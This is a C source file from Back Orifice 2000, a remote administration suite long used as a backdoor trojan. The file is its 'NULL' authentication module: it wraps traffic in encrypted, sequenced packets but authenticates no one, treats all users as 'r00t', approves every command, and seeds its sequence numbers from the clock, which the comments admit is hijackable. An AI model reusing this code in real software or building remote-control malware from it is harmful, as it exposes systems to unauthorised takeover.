/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

// NULL Authentication Module: Is only responsible for encryption of data
// not user authentication. Assumes all users log in as 'r00t'.
#include<windows.h>
#include<winsock.h>
#include<auth.h>
#include<iohandler.h>
#include<nullauth.h>
#include<config.h>

AUTH_HANDLER g_NullAH;
	
#pragma pack(push,1)

typedef struct {
	int nUserId;
	DWORD dwSeq;
	DWORD dwRemoteSeq;
} NULLAUTH_INTERNAL;

typedef struct {
	DWORD dwTag;
	DWORD dwSeq;
} SEQ_HDR;

#define AUTH_TAG 0xCDC31337
#define AUTH_TIMEOUT 5000

#pragma pack(pop)

int _cdecl NULLAUTH_Insert(void)
{
	return 0;
}

int _cdecl NULLAUTH_Remove(void)
{
	return 0;
}

char * _cdecl NULLAUTH_Query(void)
{
	return "NULLAUTH: Single User / Encrypt Only";
}


void * _cdecl NULLAUTH_OnListen(CIOSocket *pSock, CEncryptionEngine *pEnc, int nUserId)
{
	NULLAUTH_INTERNAL *pNAI=(NULLAUTH_INTERNAL *)malloc(sizeof(NULLAUTH_INTERNAL));
	if(pNAI==NULL) return NULL;
	
	pNAI->nUserId=nUserId;
	pNAI->dwSeq=0;
	pNAI->dwRemoteSeq=0;

	return pNAI;
}

static int SequenceEncryptPacket(CEncryptionEngine *pEnc, BYTE *pIn, int nInLen, BYTE **ppOut, int *pnOutLen, SEQ_HDR *pSeq)
{
	// Create encrypt buffer
	int nSize=nInLen+sizeof(SEQ_HDR);
	BYTE *pDum=(BYTE *)malloc(nSize);
	if(pDum==NULL) {
		*ppOut=NULL;
		*pnOutLen=0;
		return -1;
	}
	
	// Copy data
	memcpy(pDum,pSeq,sizeof(SEQ_HDR));
	memcpy(pDum+sizeof(SEQ_HDR),pIn,nInLen);
	
	// Encrypt data
	BYTE *pData;
	int nDataLen;
	pData=pEnc->Encrypt(pDum,nSize,&nDataLen);
	free(pDum);
	if(pData==NULL) return -1;

	// Create output buffer
	nSize=nDataLen;
	pDum=(BYTE *)malloc(nSize);
	if(pDum==NULL) {
		pEnc->Free(pData);
		*ppOut=NULL;
		*pnOutLen=0;
		return -1;
	}
	
	// Copy data
	memcpy(pDum,pData,nSize);
	pEnc->Free(pData);
	
	// Return data
	*ppOut=pDum;
	*pnOutLen=nSize;

	return 0;
}

static int UnsequenceDecryptPacket(CEncryptionEngine *pEnc, BYTE *pIn, int nInLen, BYTE **ppOut, int *pnOutLen, SEQ_HDR *pSeq)
{
	// Decrypt data
	BYTE *pDum;
	int nSize;
	pDum=pEnc->Decrypt(pIn,nInLen,&nSize);
	if(pDum==NULL) {
		*ppOut=NULL;
		*pnOutLen=0;
		return -1;
	}
	if(nSize<sizeof(SEQ_HDR)) {
		pEnc->Free(pDum);
		*ppOut=NULL;
		*pnOutLen=0;
		return -1;
	}
	
	// Create output buffer
	int nDataLen=nSize-sizeof(SEQ_HDR);
	BYTE *pData=(BYTE *)malloc(nDataLen);
	if(pData==NULL) {
		pEnc->Free(pDum);
		*ppOut=NULL;
		*pnOutLen=0;
		return -1;
	}
	
	// Copy data
	memcpy(pSeq,pDum,sizeof(SEQ_HDR));
	memcpy(pData,pDum+sizeof(SEQ_HDR),nDataLen);
	pEnc->Free(pDum);

	// Return data
	*ppOut=pData;
	*pnOutLen=nDataLen;

	return 0;
}

static void SequenceFreePacket(BYTE *pData)
{
	free(pData);
}	


void * _cdecl NULLAUTH_OnConnect(CIOSocket *pSock, CEncryptionEngine *pEnc, int nUserId)
{	
	NULLAUTH_INTERNAL *pNAI=(NULLAUTH_INTERNAL *)malloc(sizeof(NULLAUTH_INTERNAL));
	if(pNAI==NULL) return NULL;

	// Set up internal data structure
	pNAI->nUserId=nUserId;
	pNAI->dwSeq=GetTickCount(); // Should be a random number generator. Can be hijacked if the encryption key is known.
	
	// Prepare authentication packet
	SEQ_HDR hdr;
	hdr.dwTag=AUTH_TAG;
	hdr.dwSeq=(pNAI->dwSeq-1);
	
	int nSize=(GetTickCount() & 0xFF);	// Attention would-be hackers: Initial packet size is somewhat related to initial sequence number.
	BYTE *pDum=(BYTE *)malloc(nSize);
	if(pDum==NULL) {
		free(pNAI);
		return NULL;
	}
	memset(pDum,69,nSize);

	// Sequence and encrypt packet	
	BYTE *pOut;
	int nOutLen;
	if(SequenceEncryptPacket(pEnc,pDum,nSize,&pOut,&nOutLen,&hdr)<0) {
		free(pDum);
		free(pNAI);
		return NULL;
	}
	free(pDum);
	
	// Send initial packet
	if(pSock->Send(pOut,nOutLen)<=0) {
		SequenceFreePacket(pOut);
		free(pNAI);
		return NULL;
	}
	SequenceFreePacket(pOut);

	// Wait for authentication handshake
	DWORD dwTime=GetTickCount();
	while(pSock->Recv(&pDum,&nSize)<=0) {
		// Check for operation timeout
		if((GetTickCount()-dwTime)>=AUTH_TIMEOUT) {
			free(pNAI);
			return NULL;
		}
	}		
	
	// Decrypt handshake packet
	if(UnsequenceDecryptPacket(pEnc,pDum,nSize,&pOut,&nOutLen,&hdr)<0) {
		pSock->Free(pDum);
		free(pNAI);
		return NULL;
	}
	pSock->Free(pDum);	
	SequenceFreePacket(pOut);

	// Verify tag and store remote sequence number
	if(hdr.dwTag!=AUTH_TAG) {
		free(pNAI);
		return NULL;
	}
	pNAI->dwRemoteSeq=hdr.dwSeq+1;
	
	return pNAI;
}

void * _cdecl NULLAUTH_OnAccept(void *pInternal, CIOSocket *pSock, CEncryptionEngine *pEnc)
{
	BYTE *pDum,*pOut;
	int nSize,nOutLen;
	SEQ_HDR hdr;

	NULLAUTH_INTERNAL *pNAI=(NULLAUTH_INTERNAL *)pInternal;
	NULLAUTH_INTERNAL *pNewNAI=(NULLAUTH_INTERNAL *)malloc(sizeof(NULLAUTH_INTERNAL));
	if(pNewNAI==NULL) return NULL;

	// Set up internal data structure
	pNewNAI->nUserId=pNAI->nUserId;
	pNewNAI->dwSeq=GetTickCount(); // Should be a random number generator. Can be hijacked if the encryption key is known.
	
	// Wait for initial packet
	DWORD dwTime=GetTickCount();
	while(pSock->Recv(&pDum,&nSize)<=0) {
		// Check for operation timeout
		if((GetTickCount()-dwTime)>=AUTH_TIMEOUT) {
			free(pNewNAI);
			return NULL;
		}
	}		
	
	// Decrypt handshake packet
	if(UnsequenceDecryptPacket(pEnc,pDum,nSize,&pOut,&nOutLen,&hdr)<0) {
		pSock->Free(pDum);
		free(pNewNAI);
		return NULL;
	}
	pSock->Free(pDum);	
	SequenceFreePacket(pOut);

	// Verify tag and store remote sequence number
	if(hdr.dwTag!=AUTH_TAG) {
		free(pNewNAI);
		return NULL;
	}
	pNewNAI->dwRemoteSeq=hdr.dwSeq+1;

	// Prepare handshake packet
	hdr.dwTag=AUTH_TAG;
	hdr.dwSeq=(pNewNAI->dwSeq-1);
	
	nSize=(GetTickCount() & 0xFF);	// Attention would-be hackers: Initial packet size is somewhat related to initial sequence number.
	pDum=(BYTE *)malloc(nSize);
	if(pDum==NULL) {
		free(pNewNAI);
		return NULL;
	}

	// Sequence and encrypt packet	
	if(SequenceEncryptPacket(pEnc,pDum,nSize,&pOut,&nOutLen,&hdr)<0) {
		free(pDum);
		free(pNewNAI);
		return NULL;
	}
	free(pDum);
	
	// Send initial packet
	if(pSock->Send(pOut,nOutLen)<=0) {
		SequenceFreePacket(pOut);
		free(pNewNAI);
		return NULL;
	}
	SequenceFreePacket(pOut);
	
	return pNewNAI;
}

int _cdecl NULLAUTH_GetUserID(void *pInternal)
{
	if(pInternal==NULL) return -1;

	return ((NULLAUTH_INTERNAL *)pInternal)->nUserId;
}

int _cdecl NULLAUTH_OnClose(void *pInternal)
{
	if(pInternal==NULL) return -1;
	
	free(pInternal);
	
	return 0;
}

int _cdecl NULLAUTH_OnRecv(void *pInternal, CEncryptionEngine *pEnc, BYTE *pData, int nDataLen, BYTE **ppInData, int *pnInDataLen)
{
	BYTE *pDum;
	int nSize;
	SEQ_HDR hdr;
	NULLAUTH_INTERNAL *pNAI=(NULLAUTH_INTERNAL *)pInternal;
	if(ppInData==NULL || pnInDataLen==NULL || pData==NULL) 
		return -1;
	
	// This part does decryption and unsequencing
	
	// Decrypt packet
	if(UnsequenceDecryptPacket(pEnc,pData,nDataLen,&pDum,&nSize,&hdr)<0) {
		*ppInData=NULL;
		*pnInDataLen=0;
		return -1;
	}
	
	// Verify tag and remote sequence number
	if((hdr.dwTag!=AUTH_TAG) || (hdr.dwSeq!=pNAI->dwRemoteSeq))  {
		SequenceFreePacket(pDum);
		*ppInData=NULL;
		*pnInDataLen=0;
		return -1;
	}

	// Increment expected sequence number
	pNAI->dwRemoteSeq++;

	// Return decrypted packet
	*ppInData=pDum;
	*pnInDataLen=nSize;

	return 0;
}

int _cdecl NULLAUTH_OnSend(void *pInternal, CEncryptionEngine *pEnc, BYTE *pData, int nDataLen, BYTE **ppOutData, int *pnOutDataLen)
{
	SEQ_HDR hdr;
	BYTE *pDum;
	int nSize;
	NULLAUTH_INTERNAL *pNAI=(NULLAUTH_INTERNAL *)pInternal;
	if(ppOutData==NULL || pnOutDataLen==NULL) return -1;
	
	// This part does encryption and sequencing
	
	// Create sequence header
	hdr.dwSeq=pNAI->dwSeq;
	hdr.dwTag=AUTH_TAG;

	// Encrypt packet
	if(SequenceEncryptPacket(pEnc,pData,nDataLen,&pDum,&nSize,&hdr)<0) {
		*ppOutData=NULL;
		*pnOutDataLen=0;
		return -1;
	}

	// Increment sequence number
	pNAI->dwSeq++;

	// Return encrypted packet
	*ppOutData=pDum;
	*pnOutDataLen=nSize;
	
	return 0;
}

void _cdecl NULLAUTH_Free(void *pInternal, BYTE *pBuffer)
{	
	if(pBuffer==NULL) return;
	
	SequenceFreePacket(pBuffer);
}

// Returns true if the user can execute said command.
// Returns false if the user doesn't have priveleges.
BOOL _cdecl NULLAUTH_ValidateCommand(int nUserId, int nCommand)
{
	return TRUE;
}

AUTH_HANDLER *GetNullAuthHandler(void)
{	
	g_NullAH.pInsert=NULLAUTH_Insert;
	g_NullAH.pRemove=NULLAUTH_Remove;
	g_NullAH.pQuery=NULLAUTH_Query;
	g_NullAH.pOnListen=NULLAUTH_OnListen;
	g_NullAH.pOnConnect=NULLAUTH_OnConnect;
	g_NullAH.pOnAccept=NULLAUTH_OnAccept;
	g_NullAH.pGetUserID=NULLAUTH_GetUserID;
	g_NullAH.pOnClose=NULLAUTH_OnClose;
	g_NullAH.pOnRecv=NULLAUTH_OnRecv;
	g_NullAH.pOnSend=NULLAUTH_OnSend;
	g_NullAH.pFree=NULLAUTH_Free;
	g_NullAH.pValidateCommand=NULLAUTH_ValidateCommand;
	
	return &g_NullAH;
}
